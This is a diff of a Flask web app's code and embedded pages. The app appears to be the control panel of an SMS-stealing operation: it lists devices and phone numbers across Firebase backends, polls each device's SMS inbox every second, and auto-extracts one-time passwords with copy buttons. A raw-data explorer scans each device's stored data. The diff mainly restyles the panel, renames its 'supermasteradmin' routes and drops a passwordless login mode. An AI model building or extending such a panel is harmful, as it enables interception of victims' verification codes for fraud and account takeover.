+.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;border-radius:8px;font-weight:800;font-size:11px}
+.sms-list{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(99,102,241,.06)}
+.sms-item{padding:16px;border-bottom:1px solid #f1f5f9}
 .sms-item:last-child{border-bottom:none}
-.sms-item.fresh{background:linear-gradient(90deg,rgba(0,255,65,.08),transparent 60%);border-left:3px solid #00ff41}
+.sms-item.fresh{background:linear-gradient(90deg,#f0fdf4,#fff 60%);border-left:4px solid #16a34a}
 .sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
-.sender{font-size:11px;font-weight:900;color:#ff3860;display:flex;align-items:center;flex-wrap:wrap;font-family:'Courier New',monospace;text-transform:uppercase}
-.new-badge{background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;font-size:9px;font-weight:900;padding:2px 7px;border-radius:4px;margin-left:6px;letter-spacing:1px}
-.sms-time{font-size:10px;color:#4a5270;font-family:'Courier New',monospace}
-.sms-body{font-size:13px;color:#c5d0e6;line-height:1.6;word-break:break-word;white-space:pre-wrap;font-family:'Courier New',monospace}
-.otp-highlight{background:linear-gradient(135deg,rgba(0,255,65,.2),rgba(0,229,255,.2));color:#00ff41;padding:2px 6px;border-radius:4px;font-weight:900;border:1px solid rgba(0,255,65,.4)}
-.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;border:none;border-radius:6px;font-weight:900;font-size:11px;min-height:40px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.empty{text-align:center;padding:50px 20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:10px;letter-spacing:1px;font-family:'Courier New',monospace}
-.loading-text{text-align:center;padding:24px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:8px;margin-bottom:14px;letter-spacing:1px;font-family:'Courier New',monospace}
-.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#ff3860;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#00ff41;color:#0a0e1a;padding:14px 24px;border-radius:8px;font-weight:900;font-size:13px;z-index:9999;transition:transform .3s;pointer-events:none;letter-spacing:1px;font-family:'Courier New',monospace}
+.sender{font-size:12px;font-weight:800;color:#ef4444;display:flex;align-items:center;flex-wrap:wrap}
+.new-badge{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:10px;margin-left:6px}
+.sms-time{font-size:11px;color:#94a3b8}
+.sms-body{font-size:14px;color:#334155;line-height:1.55;word-break:break-word;white-space:pre-wrap}
+.otp-highlight{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;padding:2px 6px;border-radius:5px;font-weight:700}
+.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:20px;font-weight:700;font-size:12px;min-height:40px}
+.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
+.loading-text{text-align:center;padding:24px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#8b5cf6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none}
 .toast.show{transform:translateX(-50%) translateY(0)}
 .hidden{display:none !important}</style></head><body>
 
 <div class="topbar">
-<div class="brand"><span class="toxic">☣ TOXIC</span> — FIREBASE</div>
-<div class="nav"><a href="/supermasteradmin/dashboard" class="nav-link">◉ NUMBERS</a><a href="/supermasteradmin/firebases" class="nav-link active">🔥 FIREBASES</a><a href="/supermasteradmin/security" class="nav-link">🔒</a></div>
+<div class="brand"><span class="alex">Alex</span> — FIREBASE</div>
+<div class="nav"><a href="/admin/dashboard" class="nav-link">📱 Numbers</a><a href="/firebases" class="nav-link active">🔥 Firebases</a><a href="/admin/security" class="nav-link" style="background:#fef3c7;color:#92400e">🔒</a></div>
 </div>
 
 <div class="container">
 <div class="hero">
-<h1>🔥 <span id="fb-name">LOADING...</span></h1>
+<h1>🔥 <span id="fb-name">Loading...</span></h1>
 <div class="hash">🔒 ID: <span id="fb-hash">hidden</span></div>
 <div class="hero-stats">
-<div class="hs"><b id="h-dev">0</b><span>DEVICES</span></div>
-<div class="hs online"><b id="h-on">0</b><span>ONLINE</span></div>
-<div class="hs offline"><b id="h-off">0</b><span>OFFLINE</span></div>
-<div class="hs otp"><b id="h-otp">0</b><span>OTPS</span></div>
+<div class="hs"><b id="h-dev">0</b><span>Devices</span></div>
+<div class="hs online"><b id="h-on">0</b><span>Online</span></div>
+<div class="hs offline"><b id="h-off">0</b><span>Offline</span></div>
+<div class="hs otp"><b id="h-otp">0</b><span>OTPs</span></div>
 </div>
 </div>
 
 <div id="list-view">
-<div class="loading-text" id="loading-text"><span class="spinner"></span>LOADING...</div>
+<div class="loading-text" id="loading-text"><span class="spinner"></span>Loading...</div>
 <div id="list-content" class="hidden">
-<div class="search-box"><input id="search-num" placeholder="▸ SEARCH" oninput="renderNumbers()"></div>
-<div class="list-header"><h2>◉ NUMBERS</h2><span class="count" id="num-count">0</span></div>
+<div class="search-box"><input id="search-num" placeholder="🔎 Search" oninput="renderNumbers()"></div>
+<div class="list-header"><h2>📱 Numbers</h2><span class="count" id="num-count">0</span></div>
 <div id="num-list"></div>
 </div>
 </div>
 
 <div id="inbox-view" class="hidden">
 <div class="inbox-header">
-<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">ONLINE</span></div></div></div>
-<div class="inbox-meta"><span>⚡ AUTO 1S · LATEST 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">⟳</span></div>
+<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
+<div class="inbox-meta"><span>⚡ auto 1s · Latest 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">🔄</span></div>
 </div>
 <div id="top-number-badge" class="top-number-badge hidden">
 <div class="tn-icon">🏆</div>
 <div class="tn-info">
 <div class="tn-num" id="tn-num">-</div>
-<div class="tn-count">MOST FREQUENT SMS NUMBER <span class="tn-highlight" id="tn-count-badge">0x</span></div>
+<div class="tn-count">Sabse zyada baar aaya SMS me <span class="tn-highlight" id="tn-count-badge">0 bar</span></div>
 </div>
 </div>
 <div id="sms-container"></div>
@@ -2716,7 +2608,7 @@ function toast(text){ const t = document.getElementById('toast'); t.textContent 
 async function loadFirebase(){
   try{
     const r = await fetch('/api/firebase/' + FB_ID); const d = await r.json();
-    if(!d.success){ document.getElementById('loading-text').innerHTML = '❌ '+(d.error||'ERROR'); return; }
+    if(!d.success){ document.getElementById('loading-text').innerHTML = '❌ '+(d.error||'Error'); return; }
     document.getElementById('fb-name').textContent = d.name || 'unnamed';
     document.getElementById('fb-hash').textContent = d.hash || 'hidden';
     document.getElementById('h-dev').textContent = d.device_count;
@@ -2728,40 +2620,44 @@ async function loadFirebase(){
     document.getElementById('loading-text').classList.add('hidden');
     document.getElementById('list-content').classList.remove('hidden');
     renderNumbers();
-  }catch(e){ document.getElementById('loading-text').innerHTML = '❌ NETWORK ERROR'; }
+  }catch(e){ document.getElementById('loading-text').innerHTML = '❌ Network error'; }
 }
 
 function renderNumbers(){
   const q = (document.getElementById('search-num').value || '').toLowerCase();
   const box = document.getElementById('num-list');
   const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
-  if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 NO NUMBERS</div>'; return; }
+  if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers</div>'; return; }
   box.innerHTML = filtered.map(n => {
     const isOnline = n.online === true;
     const isUnknown = (n.number || '').startsWith('UNKNOWN-');
     const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
     const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
-    const badgeTxt = isOnline ? 'ONLINE' : 'OFFLINE';
+    const badgeTxt = isOnline ? 'Online' : 'Offline';
     const titleCls = isUnknown ? 'unknown' : '';
     return `
       <div class="num-card">
-        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '?' : '◉'}</div>
+        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '❓' : '📶'}</div>
         <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
           <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
-          <div class="num-sub"><span class="pill">✉ ${n.msg_count} SMS</span>${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}</div>
+          <div class="num-sub">
+            <span class="pill">📨 ${n.msg_count} SMS</span>
+            ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
+          </div>
         </div>
         <div class="card-actions">
           <button class="raw-btn" onclick="event.stopPropagation();openRawData(${numbers.indexOf(n)})" title="Raw Data">🔍</button>
         </div>
         <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
-      </div>`;
+      </div>
+    `;
   }).join('');
 }
 
 function openRawData(idx){
   if(idx < 0 || idx >= numbers.length) return;
   const n = numbers[idx];
-  const url = '/supermasteradmin/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
+  const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
   window.open(url, '_blank');
 }
 
@@ -2773,41 +2669,58 @@ async function openInbox(n){
   document.getElementById('inbox-view').classList.remove('hidden');
   document.getElementById('inbox-num').textContent = n.number;
   const statusEl = document.getElementById('inbox-status'); const statusTxt = document.getElementById('inbox-status-text');
-  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'ONLINE'; }
-  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'OFFLINE'; }
-  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> LOADING...</div>';
+  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
+  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
+  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
   await loadInbox(false);
   if(refreshTimer) clearInterval(refreshTimer);
   refreshTimer = setInterval(()=>loadInbox(false), 1000);
 }
 
 function findTopNumber(msgs){
-  const counter = {}; const senderNums = new Set();
-  msgs.forEach(m => { const found = (m.from || '').match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || []; found.forEach(n => senderNums.add(n)); });
+  const counter = {};
+  const senderNums = new Set();
   msgs.forEach(m => {
-    const found = (m.message || '').match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => { if(senderNums.has(n)) return; if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return; counter[n] = (counter[n] || 0) + 1; });
+    const from = m.from || '';
+    const found = from.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
+    found.forEach(n => senderNums.add(n));
+  });
+  msgs.forEach(m => {
+    const text = m.message || '';
+    const found = text.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
+    found.forEach(n => {
+      if(senderNums.has(n)) return;
+      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
+      counter[n] = (counter[n] || 0) + 1;
+    });
   });
   let topNum = null, topCount = 0;
-  for(const [num, cnt] of Object.entries(counter)){ if(cnt > topCount){ topNum = num; topCount = cnt; } }
+  for(const [num, cnt] of Object.entries(counter)){
+    if(cnt > topCount){ topNum = num; topCount = cnt; }
+  }
   return topNum ? {number: topNum, count: topCount} : null;
 }
 
 function updateTopNumberBadge(msgs){
   const badge = document.getElementById('top-number-badge');
   const top = findTopNumber(msgs);
-  if(top && top.count >= 2){ document.getElementById('tn-num').textContent = '📞 ' + top.number; document.getElementById('tn-count-badge').textContent = top.count + 'x'; badge.classList.remove('hidden'); }
-  else { badge.classList.add('hidden'); }
+  if(top && top.count >= 2){
+    document.getElementById('tn-num').textContent = '📞 ' + top.number;
+    document.getElementById('tn-count-badge').textContent = top.count + ' bar';
+    badge.classList.remove('hidden');
+  } else {
+    badge.classList.add('hidden');
+  }
 }
 
 async function loadInbox(showLoader){
   if(!currentNum) return;
-  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> REFRESHING...</div>'; }
+  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>'; }
   const controller = new AbortController(); const timeoutId = setTimeout(() => controller.abort(), 15000);
   try{
     const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
     clearTimeout(timeoutId); const d = await r.json();
-    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
+    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ '+(d.error||'Error')+'</div>'; return; }
     const msgs = d.messages || [];
     const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
     if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(msgs); }
@@ -2819,23 +2732,24 @@ function renderMessages(msgs){
   const now = Math.floor(Date.now() / 1000);
   let list = [...msgs].sort((a, b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 60);
   updateTopNumberBadge(list);
-  if(!list.length){ box.innerHTML = '<div class="empty">📭 NO SMS</div>'; return; }
+  if(!list.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
   box.innerHTML = '<div class="sms-list">' + list.map(m => {
     const otp = m.otp || extractOtp(m.message);
     const body = otp ? escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`) : escapeHtml(m.message);
-    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 COPY OTP ${otp}</button>` : '';
+    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : '';
     const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
     const timeStr = m.date_string ? m.date_string : fmtTime(ts);
     const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
     return `
       <div class="sms-item ${isFresh?'fresh':''}">
         <div class="sms-head">
-          <div class="sender">${escapeHtml(m.from || 'UNKNOWN')} ${newBadge}</div>
+          <div class="sender">${escapeHtml(m.from || 'Unknown')} ${newBadge}</div>
           <div class="sms-time">${escapeHtml(timeStr)}</div>
         </div>
         <div class="sms-body">${body}</div>
         ${copyBtn}
-      </div>`;
+      </div>
+    `;
   }).join('') + '</div>';
 }
 
@@ -2849,16 +2763,21 @@ function backToList(){
 function extractOtp(text){
   if(!text) return '';
   const t = String(text);
-  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i); if(m) return m[1];
-  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i); if(m) return m[1];
-  m = t.match(/#(\d{4,8})/); if(m) return m[1];
+  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
+  if(m) return m[1];
+  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
+  if(m) return m[1];
+  m = t.match(/#(\d{4,8})/);
+  if(m) return m[1];
   return '';
 }
 
 function fmtTime(ts){
   if(!ts) return '';
   try{
-    let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
+    let t = parseInt(ts);
+    if(t > 1e12) t = Math.floor(t/1000);
+    if(t < 1e9) return String(ts);
     const d = new Date(t * 1000);
     const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
     return d.toLocaleString('en-IN', opts).replace(',', ' |');
@@ -2866,7 +2785,7 @@ function fmtTime(ts){
 }
 
 function copyOtp(code){
-  const done = ()=>toast('✅ COPIED: ' + code);
+  const done = ()=>toast('✅ Copied: ' + code);
   if(navigator.clipboard){ navigator.clipboard.writeText(code).then(done).catch(()=>{ const ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
 }
 
@@ -2884,50 +2803,49 @@ setInterval(loadFirebase, 30000);
 DEBUG_HTML = r"""<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>Raw Data Explorer</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
-body{background:#0a0e1a;color:#e0e6ff;min-height:100vh;padding:14px;background-image:radial-gradient(ellipse at top,#1a0a0e 0%,#0a0e1a 60%)}
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif}
+body{background:#0f172a;color:#e2e8f0;min-height:100vh;padding:14px}
 .wrap{max-width:900px;margin:0 auto}
-h1{font-size:14px;font-weight:900;color:#ff3860;margin-bottom:6px;letter-spacing:1.5px;text-transform:uppercase;text-shadow:0 0 10px rgba(255,56,96,.5)}
-.sub{font-size:11px;color:#4a5270;margin-bottom:14px;word-break:break-all;letter-spacing:1px}
-.card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:12px;margin-bottom:10px;font-size:11px}
-.path{color:#ffd700;font-weight:900;margin-bottom:6px;font-family:'Courier New',monospace;word-break:break-all;letter-spacing:1px}
-.status-ok{color:#00ff41;font-weight:900;margin-bottom:6px;letter-spacing:1px}
-.status-empty{color:#ff3860;font-weight:900;margin-bottom:6px;letter-spacing:1px}
-.data{background:#0a0e1a;border:1px solid #1f2937;border-radius:6px;padding:10px;color:#c5d0e6;font-family:'Courier New',monospace;font-size:10px;white-space:pre-wrap;word-break:break-word;max-height:400px;overflow-y:auto}
-.summary{background:rgba(255,56,96,.08);border:1px solid rgba(255,56,96,.3);border-radius:10px;padding:14px;margin-bottom:14px;font-size:12px;letter-spacing:1px}
-.summary b{color:#ff3860}
-.back{display:inline-block;padding:10px 14px;background:#1f2937;color:#e0e6ff;text-decoration:none;border-radius:6px;font-size:11px;margin-bottom:12px;letter-spacing:1px;text-transform:uppercase;border:1px solid #374151}
-.back:hover{background:#374151}
-.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#ff3860;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px}
+h1{font-size:15px;font-weight:700;color:#a5b4fc;margin-bottom:6px}
+.sub{font-size:12px;color:#64748b;margin-bottom:14px;word-break:break-all}
+.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:12px;margin-bottom:10px;font-size:12px}
+.path{color:#fbbf24;font-weight:700;margin-bottom:6px;font-family:monospace;word-break:break-all}
+.status-ok{color:#4ade80;font-weight:600;margin-bottom:6px}
+.status-empty{color:#f87171;font-weight:600;margin-bottom:6px}
+.data{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:10px;color:#cbd5e1;font-family:monospace;font-size:10px;white-space:pre-wrap;word-break:break-word;max-height:400px;overflow-y:auto}
+.summary{background:#1e1b4b;border:1px solid #4338ca;border-radius:10px;padding:14px;margin-bottom:14px;font-size:13px}
+.summary b{color:#c4b5fd}
+.back{display:inline-block;padding:10px 14px;background:#334155;color:#e2e8f0;text-decoration:none;border-radius:8px;font-size:12px;margin-bottom:12px}
+.spinner{display:inline-block;width:14px;height:14px;border:2px solid #334155;border-top-color:#818cf8;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px}
 @keyframes spin{to{transform:rotate(360deg)}}</style></head><body>
 <div class="wrap">
-<a href="/supermasteradmin/firebases" class="back">← BACK</a>
-<h1>🔍 RAW DATA EXPLORER</h1>
-<div class="sub" id="sub">LOADING...</div>
-<div class="summary" id="summary" style="display:none">SCANNING...</div>
+<a href="/firebases" class="back">← Back</a>
+<h1>🔍 Raw Data Explorer</h1>
+<div class="sub" id="sub">Loading...</div>
+<div class="summary" id="summary" style="display:none">Scanning...</div>
 <div id="results"></div>
 </div>
 <script>
 const params = new URLSearchParams(window.location.search);
 const FB = params.get('fb');
 const DEV = params.get('id');
-document.getElementById('sub').textContent = 'DEVICE: ' + DEV;
+document.getElementById('sub').textContent = 'Device: ' + DEV;
 async function scan(){
   const results = document.getElementById('results');
-  results.innerHTML = '<div class="card"><span class="spinner"></span>SCANNING...</div>';
+  results.innerHTML = '<div class="card"><span class="spinner"></span>Scanning...</div>';
   try{
     const r = await fetch('/api/rawdata?fb=' + encodeURIComponent(FB) + '&id=' + encodeURIComponent(DEV));
     const d = await r.json();
-    if(!d.success){ results.innerHTML = '<div class="card status-empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
+    if(!d.success){ results.innerHTML = '<div class="card status-empty">❌ '+(d.error||'Error')+'</div>'; return; }
     document.getElementById('summary').style.display = 'block';
-    document.getElementById('summary').innerHTML = `🔎 <b>${d.scanned} PATHS</b> SCANNED — <b>${d.found}</b> WITH DATA`;
+    document.getElementById('summary').innerHTML = `🔎 <b>${d.scanned} paths</b> scanned — <b>${d.found}</b> with data`;
     results.innerHTML = d.results.map(item => {
       const cls = item.status === 'has_data' ? 'status-ok' : 'status-empty';
-      const statusTxt = item.status === 'has_data' ? '✅ HAS DATA' + (item.message_count ? ` — ${item.message_count} MSGS` : '') : '⚪ EMPTY';
+      const statusTxt = item.status === 'has_data' ? '✅ HAS DATA' + (item.message_count ? ` — ${item.message_count} msgs` : '') : '⚪ Empty';
       const dataTxt = item.data ? JSON.stringify(item.data, null, 2).slice(0, 3000) : '';
       return `<div class="card"><div class="path">${item.path}</div><div class="${cls}">${statusTxt}</div>${dataTxt ? `<div class="data">${escapeHtml(dataTxt)}</div>` : ''}</div>`;
     }).join('');
-  }catch(e){ results.innerHTML = '<div class="card status-empty">❌ NETWORK ERROR</div>'; }
+  }catch(e){ results.innerHTML = '<div class="card status-empty">❌ Network error</div>'; }
 }
 function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
 scan();
@@ -2941,19 +2859,6 @@ scan();
 def login_page():
     if session.get("logged_in") and session.get("role") == "user":
         return redirect(url_for("user_dashboard"))
-
-    state = get_user_panel_state()
-
-    # Panel deactivated → block
-    if not state["active"]:
-        return Response(PANEL_OFFLINE_HTML, mimetype="text/html")
-
-    # Passwordless mode → auto login
-    if state["passwordless"]:
-        session["logged_in"] = True
-        session["role"] = "user"
-        return redirect(url_for("user_dashboard"))
-
     error = ""
     if request.method == "POST":
         pwd = request.form.get("password", "")
@@ -2961,22 +2866,11 @@ def login_page():
             session["logged_in"] = True
             session["role"] = "user"
             return redirect(url_for("user_dashboard"))
-        error = '<div class="err">❌ INVALID KEY — ACCESS DENIED</div>'
-
-    # Build banner
-    banner = ""
-    if state["expires_at"] > 0:
-        banner = '<div class="status-banner temp">⏱ TEMPORARY ACCESS MODE · LIMITED TIME</div>'
-    elif state["passwordless"]:
-        banner = '<div class="status-banner pls">🔓 PASSWORDLESS MODE ACTIVE</div>'
-    else:
-        banner = '<div class="status-banner active">✓ SYSTEM OPERATIONAL</div>'
-
-    html = LOGIN_HTML.replace("__ERROR__", error).replace("__BANNER__", banner)
-    return Response(html, mimetype="text/html")
+        error = '<div class="err">❌ Wrong password!</div>'
+    return Response(LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")
 
 
-@app.route("/supermasteradmin", methods=["GET", "POST"])
+@app.route("/admin", methods=["GET", "POST"])
 def admin_login_page():
     if session.get("logged_in") and session.get("role") == "admin":
         return redirect(url_for("admin_dashboard"))
@@ -2987,7 +2881,7 @@ def admin_login_page():
             session["logged_in"] = True
             session["role"] = "admin"
             return redirect(url_for("admin_dashboard"))
-        error = '<div class="err">❌ ACCESS DENIED — ROOT KEY REQUIRED</div>'
+        error = '<div class="err">❌ Wrong admin password!</div>'
     return Response(ADMIN_LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")
 
 
@@ -3008,110 +2902,34 @@ def personal_otp():
     return Response(PERSONAL_OTP_HTML, mimetype="text/html")
 
 
-@app.route("/supermasteradmin/dashboard")
+@app.route("/admin/dashboard")
 @admin_required
 def admin_dashboard():
     return Response(ADMIN_DASHBOARD_HTML, mimetype="text/html")
 
 
-@app.route("/supermasteradmin/security")
+@app.route("/admin/security")
 @admin_required
 def admin_security():
     return Response(SECURITY_HTML, mimetype="text/html")
 
 
-@app.route("/supermasteradmin/firebases")
+@app.route("/firebases")
 @admin_required
 def firebases_page():
     return Response(FIREBASES_HTML, mimetype="text/html")
 
 
-@app.route("/supermasteradmin/firebase/<fb_id>")
+@app.route("/firebase/<fb_id>")
 @admin_required
 def firebase_view_page(fb_id):
     return Response(FIREBASE_VIEW_HTML.replace("{{FB_ID}}", fb_id), mimetype="text/html")
 
 
-@app.route("/supermasteradmin/debug")
+@app.route("/debug")
 @admin_required
 def debug_page():
     return Response(DEBUG_HTML, mimetype="text/html")
-
-
-# Legacy redirects
-@app.route("/admin")
-def legacy_admin():
-    return redirect("/supermasteradmin")
-
-@app.route("/admin/dashboard")
-def legacy_admin_dashboard():
-    return redirect("/supermasteradmin/dashboard")
-
-@app.route("/firebases")
-def legacy_firebases():
-    return redirect("/supermasteradmin/firebases")
-
-
-# ==================== PANEL STATE APIS ====================
-@app.route("/api/panel/status")
-@admin_required
-def api_panel_status():
-    state = get_user_panel_state()
-    return jsonify({"success": True, **state})
-
-
-@app.route("/api/panel/status_public")
-def api_panel_status_public():
-    state = get_user_panel_state()
-    return jsonify({
-        "success": True,
-        "active": state["active"],
-        "expires_at": state["expires_at"],
-        "passwordless": state["passwordless"],
-        "now": state["now"],
-    })
-
-
-@app.route("/api/panel/activate", methods=["POST"])
-@admin_required
-def api_panel_activate():
-    data = request.get_json() or {}
-    try:
-        minutes = int(data.get("minutes", 0))
-    except Exception:
-        minutes = 0
-    if minutes > 0:
-        expires_at = int(time.time()) + minutes * 60
-        set_setting("user_panel_expires_at", expires_at)
-    else:
-        set_setting("user_panel_expires_at", 0)
-    set_setting("user_panel_active", "true")
-    return jsonify({"success": True})
-
-
-@app.route("/api/panel/deactivate", methods=["POST"])
-@admin_required
-def api_panel_deactivate():
-    set_setting("user_panel_active", "false")
-    set_setting("user_panel_expires_at", 0)
-    return jsonify({"success": True})
-
-
-@app.route("/api/panel/passwordless", methods=["POST"])
-@admin_required
-def api_panel_passwordless():
-    data = request.get_json() or {}
-    enabled = bool(data.get("enabled", False))
-    try:
-        minutes = int(data.get("minutes", 0))
-    except Exception:
-        minutes = 0
-    set_setting("passwordless_mode", "true" if enabled else "false")
-    if enabled and minutes > 0:
-        set_setting("passwordless_expires_at", int(time.time()) + minutes * 60)
-    else:
-        set_setting("passwordless_expires_at", 0)
-    return jsonify({"success": True})
 
 
 # ==================== API ROUTES ====================
@@ -3196,6 +3014,7 @@ def api_inbox():
         return jsonify({"success": False, "error": str(e)}), 500
 
 
+# ==================== PERSONAL OTP APIs ====================
 @app.route("/api/otp/add", methods=["POST"])
 def api_otp_add():
     if not MONGO_OK:
@@ -3336,6 +3155,7 @@ def api_security_change():
     return jsonify({"success": False, "error": "Failed to save password (MongoDB down)"}), 500
 
 
+# ✅ Firebases list with per-firebase stats
 @app.route("/api/firebases", methods=["GET"])
 @admin_required
 def api_fb_list():
@@ -3345,10 +3165,15 @@ def api_fb_list():
         docs = list(fb_collection.find({}).sort("added_at", -1))
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
+    
+    # ✅ Get cached stats
     with cache["lock"]:
         fb_stats = dict(cache["fb_stats"]) if cache["fb_stats"] else {}
+    
+    # Agar cache empty hai, toh background me fetch trigger karo
     if not fb_stats:
         threading.Thread(target=fetch_fb_stats, daemon=True).start()
+    
     out = []
     for d in docs:
         url = d.get("url", "")
@@ -3456,9 +3281,11 @@ def api_fb_delete(fb_id):
     try:
         doc = fb_collection.find_one({"_id": ObjectId(fb_id)})
         fb_url = doc.get("url", "") if doc else ""
+
         res = fb_collection.delete_one({"_id": ObjectId(fb_id)})
         if res.deleted_count == 0:
             return jsonify({"success": False, "error": "Not found"}), 404
+
         with cache["lock"]:
             cache["numbers_map"] = {}
             cache["devices"] = {}
@@ -3466,6 +3293,7 @@ def api_fb_delete(fb_id):
